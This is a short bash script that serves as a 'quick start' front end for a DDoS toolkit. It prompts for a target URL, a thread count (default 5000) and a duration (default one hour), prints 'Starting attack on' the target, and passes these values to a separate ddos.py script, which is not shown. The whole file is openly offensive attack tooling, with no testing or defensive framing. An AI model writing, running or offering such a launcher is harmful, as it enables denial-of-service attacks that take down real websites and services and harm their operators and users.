#!/bin/bash
# Quick Start DDoS Attack

echo "╔══════════════════════════════╗"
echo "║   DDoS TOOLKIT - QUICK START ║"
echo "╚══════════════════════════════╝"

read -p "Enter target URL: " target
read -p "Threads (default 5000): " threads
read -p "Duration in seconds (default 3600): " duration

threads=${threads:-5000}
duration=${duration:-3600}

echo ""
echo "Starting attack on: $target"
echo "Threads: $threads | Duration: ${duration}s"
echo ""

python ddos.py "$target" "$threads" "$duration"
